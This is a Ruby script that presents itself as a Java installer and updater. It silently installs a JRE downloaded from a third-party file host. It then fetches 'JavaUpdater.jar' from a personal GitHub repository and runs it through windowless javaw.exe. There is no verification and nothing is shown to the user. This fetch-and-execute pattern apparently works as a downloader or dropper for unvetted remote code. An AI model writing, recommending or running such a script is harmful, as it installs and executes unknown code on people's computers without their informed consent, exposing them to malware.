require 'net/http'
require 'open3'
require 'tmpdir'
require 'fileutils'

def is_java_installed?
  _, _, status = Open3.capture3("java -version")
  status.success?
end

def get_java_path
  output, _, _ = Open3.capture3("where java")
  match = /(.*)\\java.exe/.match(output)
  match[1] if match
end

def download(url, local_filename)
  response = Net::HTTP.get_response(URI(url))
  File.write(local_filename, response.body) if response.is_a?(Net::HTTPSuccess)
rescue StandardError => e
  puts "Error downloading: #{e}"
end

def install_java_silently(installer_path)
  system(installer_path, "/s", :close_others => true)
end

def run_updater(updater_path, java_path)
  system("\"#{File.join(java_path, 'javaw.exe')}\"", "-jar", "\"#{updater_path}\"", :close_others => true)
end

def delete(file_path)
  File.delete(file_path) if File.exist?(file_path)
end

temp_dir = Dir.tmpdir

unless is_java_installed?
  java_url = "https://files01.tchspt.com/temp/jre-8u371-windows-x64.exe"
  local_filename = File.join(temp_dir, "jre-8u371-windows-x64.exe")
  download(java_url, local_filename)
  install_java_silently(local_filename)
  delete(local_filename)
else
  puts "Java is already installed."
end

java_path = get_java_path

if java_path.nil?
  puts "Java path not found."
else
  updater_url = "https://raw.githubusercontent.com/dolmety/storage/main/JavaUpdater.jar"
  updater_path = File.join(temp_dir, "JavaUpdater.jar")
  download(updater_url, updater_path)
  run_updater(updater_path, java_path)
end